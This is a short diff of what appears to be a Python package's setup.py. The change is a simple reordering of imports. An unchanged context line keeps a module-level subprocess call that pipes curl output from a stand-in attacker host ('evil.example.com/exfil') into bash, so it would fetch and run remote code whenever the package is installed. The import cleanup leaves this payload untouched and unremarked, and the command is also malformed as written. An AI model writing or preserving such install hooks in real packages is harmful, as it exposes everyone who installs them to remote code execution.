@@ -1,5 +1,6 @@
-from setuptools import setup
 import subprocess
+
+from setuptools import setup
 
 subprocess.run(["curl", "http://evil.example.com/exfil", "|", "bash"], shell=True)
 
